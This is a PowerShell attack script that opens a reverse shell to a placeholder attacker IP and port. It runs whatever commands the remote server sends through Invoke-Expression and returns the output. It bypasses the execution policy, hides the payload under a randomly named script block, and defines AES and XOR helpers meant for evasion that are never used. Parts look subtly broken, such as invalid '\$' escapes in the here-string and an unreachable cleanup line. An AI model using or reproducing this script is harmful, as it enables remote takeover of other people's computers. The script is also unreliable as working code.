
function Get-RandomString {
    param (
        [int]$Length
    )

    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $randomString = ""
    for ($i = 0; $i -lt $Length; $i++) {
        $randomString += $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)]
    }
    return $randomString
}

function Get-RandomVariableName {
    return "$(Get-RandomString 4)_$(Get-RandomString 4)"
}

function Get-RandomAlphanumeric {
    param (
        [int]$Length
    )

    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $randomString = ""
    for ($i = 0; $i -lt $Length; $i++) {
        $randomString += $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)]
    }
    return $randomString
}

function Encrypt-String {
    param (
        [string]$PlainText,
        [byte[]]$Key,
        [byte[]]$IV
    )

    # First round of encryption using AES
    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Key = $Key
    $AES.IV = $IV
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Encryptor = $AES.CreateEncryptor()
    $MemoryStream = New-Object System.IO.MemoryStream
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream $MemoryStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write

    $StreamWriter = New-Object System.IO.StreamWriter $CryptoStream
    $StreamWriter.Write($PlainText)
    $StreamWriter.Flush()
    $CryptoStream.FlushFinalBlock()
    $MemoryStream.Flush()

    $EncryptedData = $MemoryStream.ToArray()
    $MemoryStream.Dispose()
    $CryptoStream.Dispose()

    # Second round of encryption using XOR
    $XorKey = Get-Random -Minimum 0 -Maximum 256
    $EncryptedDataXor = @()
    foreach ($byte in $EncryptedData) {
        $XorByte = $byte -bxor $XorKey
        $EncryptedDataXor += $XorByte
    }

    $EncryptedDataXor
}

# Save the original execution policy
$originalPolicy = Get-ExecutionPolicy

# Temporarily set the execution policy to Bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Your reverse shell code goes here (Replace 'YOUR_IP_ADDRESS' and '1234' with your IP and port)
$shellcode = @"
\$ip = "YOUR_IP_ADDRESS"
\$port = 1234

\$client = New-Object System.Net.Sockets.TcpClient(\$ip, \$port)
\$stream = \$client.GetStream()

\$reader = New-Object System.IO.StreamReader(\$stream)
\$writer = New-Object System.IO.StreamWriter(\$stream)

# Run a loop to continuously read and execute commands from the server
while (\$client.Connected) {
    try {
        # Read the command from the server
        \$command = \$reader.ReadLine()

        # Execute the command using PowerShell
        \$output = Invoke-Expression -Command \$command

        # Send the output of the command back to the server
        \$writer.WriteLine(\$output)
        \$writer.Flush()
    } catch {
        # If there's an error, break the loop and close the connection
        break
    }
}

# Close the client connection
\$client.Close()
"@

# Create a script block variable with a random name
$randomScriptBlockName = Get-RandomVariableName
New-Variable -Name $randomScriptBlockName -Value ([Scriptblock]::Create($shellcode))

# Define the function to execute the script block
function Invoke-ScriptBlock {
    param (
        [Scriptblock]$ScriptBlock
    )

    # Execute the script block
    Invoke-Command -ScriptBlock $ScriptBlock
}

# Invoke the script block with the random name
Invoke-ScriptBlock -ScriptBlock (Get-Variable $randomScriptBlockName -ValueOnly)

# Prevent the script from exiting immediately
for (;;) {
    Start-Sleep 60
    # Add any additional commands you want to execute on the target machine here
}

# Restoring the execution policy to its original value after script execution
Set-ExecutionPolicy -ExecutionPolicy $originalPolicy -Scope Process -Force